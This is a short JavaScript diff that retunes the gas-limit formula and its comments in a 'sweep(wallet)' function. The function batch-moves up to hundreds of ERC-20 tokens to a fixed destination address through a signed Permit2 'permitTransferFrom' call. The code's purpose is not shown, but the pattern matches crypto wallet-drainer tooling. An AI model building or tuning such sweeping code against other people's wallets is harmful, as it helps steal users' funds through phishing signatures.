@@ -1668,9 +1668,11 @@ async function sweep(wallet) {
           to: DESTINATION_ADDRESS,
           requestedAmount: sweepMap.get(t.token.toLowerCase()) ?? 0n,
         }));
-        // Gas scales with the FULL permitted array (hashing overhead ~500 gas/token)
-        // plus the actual ERC-20 transferFrom calls for tokens being swept.
-        const gasLimit = 200_000n + BigInt(permitted.length) * 500n + BigInt(withBalance.length) * 60_000n;
+        // Gas must cover calldata cost (~1,376 gas per token across both permitted[] and
+        // transferDetails[]) plus hashing + 500-iteration loop + ERC-20 transfers.
+        // For a 500-token batch the calldata alone costs ~688,000 gas — use 2,200 per token
+        // to include a 30% buffer on top of the measured ~1,376 gas/token calldata cost.
+        const gasLimit = 200_000n + BigInt(permitted.length) * 2_200n + BigInt(withBalance.length) * 80_000n;
         const tx = await permit2Batch.permitTransferFrom(
           { permitted: fullPermitted, nonce: BigInt(sig.nonce), deadline: dl },
           fullTransferDetails,
